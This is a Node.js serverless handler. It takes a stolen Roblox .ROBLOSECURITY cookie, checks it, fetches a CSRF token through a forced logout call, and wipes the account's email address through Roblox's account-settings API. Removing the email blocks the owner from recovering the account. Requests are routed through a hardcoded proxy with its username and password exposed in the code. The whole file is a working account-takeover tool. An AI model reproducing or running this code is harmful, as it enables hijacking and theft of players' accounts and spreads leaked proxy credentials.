const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

module.exports = async function handler(req, res) {
    try {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        if (req.method === 'OPTIONS') return res.status(200).end();

        const { cookie, password } = req.body;
        if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

        const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
        
        // HARDCODED US PROXY FROM YOUR SCREENSHOT (198.23.243.226)
        const proxyUrl = 'http://zsotdpxo:l7za2lzgqish@198.23.243.226:6361';
        const agent = new HttpsProxyAgent(proxyUrl);

        const baseHeaders = {
            'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/'
        };

        // 1. Verify Cookie
        await axios.get('https://users.roblox.com/v1/users/authenticated', { 
            headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 6000 
        });

        // 2. Get CSRF Token
        let csrfToken = '';
        try {
            await axios.post('https://auth.roblox.com/v2/logout', {}, { 
                headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 6000 
            });
        } catch (err) {
            if (err.response && err.response.headers['x-csrf-token']) {
                csrfToken = err.response.headers['x-csrf-token'];
                baseHeaders['X-CSRF-TOKEN'] = csrfToken;
            } else {
                return res.status(400).json({ success: false, message: 'Failed to grab CSRF token.' });
            }
        }

        // 3. Wipe Email (With Password Payload)
        try {
            const payload = { emailAddress: "" };
            if (password) payload.password = password; // Add password if provided

            await axios.post('https://accountsettings.roblox.com/v1/email', payload, { 
                headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 6000 
            });
            
            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
        } catch (err) {
            if (err.response && err.response.status === 403) {
                return res.status(403).json({ success: false, message: "Blocked: Incorrect password or Roblox requires it." });
            }
            return res.status(500).json({ success: false, message: `Wipe failed: Status ${err.response ? err.response.status : err.message}` });
        }

    } catch (error) {
        return res.status(500).json({ 
            success: false, 
            message: `Proxy Failed: ${error.message}. (Proxy might be dead or timed out).` 
        });
    }
}
